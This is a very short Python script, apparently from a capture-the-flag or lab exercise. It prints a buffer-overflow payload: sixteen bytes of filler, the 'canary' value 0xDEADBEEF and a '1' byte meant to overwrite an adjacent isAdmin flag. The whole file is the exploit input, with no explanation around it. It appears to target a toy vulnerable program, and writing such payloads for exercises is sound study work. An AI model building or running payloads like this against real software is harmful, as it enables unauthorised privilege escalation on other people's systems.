#!/bin/env python
import sys

buffer = b"AAAABBBBCCCCDDDD"
canary = b"\xEF\xBE\xAD\xDE"
isAdmin = b"1\n"

sys.stdout.buffer.write(buffer + canary + isAdmin)